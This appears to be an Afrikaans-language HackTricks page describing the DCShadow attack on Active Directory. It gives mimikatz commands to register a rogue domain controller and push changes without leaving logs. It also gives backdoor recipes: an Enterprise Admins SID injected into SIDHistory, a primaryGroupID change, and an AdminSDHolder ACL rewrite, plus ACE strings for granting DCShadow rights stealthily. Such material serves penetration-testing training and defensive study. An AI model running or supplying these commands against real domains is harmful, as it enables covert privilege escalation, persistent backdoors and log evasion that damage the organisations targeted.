{{#include ../../banners/hacktricks-training.md}}

# DCShadow

Dit registreer 'n **nuwe Domeinbeheerder** in die AD en gebruik dit om **atribute** (SIDHistory, SPNs...) op gespesifiseerde voorwerpe **te druk** **sonder** om enige **logs** oor die **wysigings** agter te laat. Jy **het DA** regte nodig en moet binne die **worteldomein** wees.\
Let daarop dat as jy verkeerde data gebruik, sal daar baie lelike logs verskyn.

Om die aanval uit te voer, het jy 2 mimikatz instansies nodig. Een van hulle sal die RPC bedieners met SYSTEM regte begin (jy moet hier die veranderinge wat jy wil maak, aandui), en die ander instansie sal gebruik word om die waardes te druk:
```bash:mimikatz1 (RPC servers)
!+
!processtoken
lsadump::dcshadow /object:username /attribute:Description /value="My new description"
```

```bash:mimikatz2 (push) - Needs DA or similar
lsadump::dcshadow /push
```
Let wel dat **`elevate::token`** nie in `mimikatz1` sessie sal werk nie, aangesien dit die bevoegdhede van die draad verhoog het, maar ons moet die **bevoegdheid van die proses** verhoog.\
Jy kan ook 'n "LDAP" objek kies: `/object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local`

Jy kan die veranderinge vanaf 'n DA of vanaf 'n gebruiker met hierdie minimale toestemmings druk:

- In die **domein objek**:
- _DS-Install-Replica_ (Voeg/Verwyder Replica in Domein)
- _DS-Replication-Manage-Topology_ (Bestuur Replicasie Topologie)
- _DS-Replication-Synchronize_ (Replicasie Sinchronisasie)
- Die **Sites objek** (en sy kinders) in die **Konfigurasie houer**:
- _CreateChild en DeleteChild_
- Die objek van die **rekenaar wat geregistreer is as 'n DC**:
- _WriteProperty_ (Nie Skryf nie)
- Die **teiken objek**:
- _WriteProperty_ (Nie Skryf nie)

Jy kan [**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1) gebruik om hierdie bevoegdhede aan 'n onbevoegde gebruiker te gee (let op dat dit 'n paar logs sal agterlaat). Dit is baie meer beperkend as om DA bevoegdhede te hê.\
Byvoorbeeld: `Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose` Dit beteken dat die gebruikersnaam _**student1**_ wanneer hy aan die masjien _**mcorp-student1**_ ingelog is, DCShadow bevoegdhede oor die objek _**root1user**_ het.

## Gebruik van DCShadow om agterdeure te skep
```bash:Set Enterprise Admins in SIDHistory to a user
lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-521-280534878-1496970234-700767426-519
```

```bash:Chage PrimaryGroupID (put user as member of Domain Administrators)
lsadump::dcshadow /object:student1 /attribute:primaryGroupID /value:519
```

```bash:Modify ntSecurityDescriptor of AdminSDHolder (give Full Control to a user)
#First, get the ACE of an admin already in the Security Descriptor of AdminSDHolder: SY, BA, DA or -519
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Admin SDHolder,CN=System,DC=moneycorp,DC=local")).psbase.Objec tSecurity.sddl
#Second, add to the ACE permissions to your user and push it using DCShadow
lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:<whole modified ACL>
```
## Shadowception - Gee DCShadow regte met behulp van DCShadow (geen gewysigde regte logs)

Ons moet die volgende ACE's met ons gebruiker se SID aan die einde byvoeg:

- Op die domein objek:
- `(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
- `(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;UserSID)`
- `(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
- Op die aanvaller rekenaar objek: `(A;;WP;;;UserSID)`
- Op die teiken gebruiker objek: `(A;;WP;;;UserSID)`
- Op die Sites objek in die Konfigurasie houer: `(A;CI;CCDC;;;UserSID)`

Om die huidige ACE van 'n objek te kry: `(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=loca l")).psbase.ObjectSecurity.sddl`

Let daarop dat jy in hierdie geval **verskeie veranderinge** moet maak, nie net een nie. So, in die **mimikatz1 sessie** (RPC bediener) gebruik die parameter **`/stack` met elke verandering** wat jy wil maak. Op hierdie manier, sal jy net een keer **`/push`** hoef te doen om al die gestopte veranderinge in die rogue bediener uit te voer.

[**Meer inligting oor DCShadow in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)

{{#include ../../banners/hacktricks-training.md}}
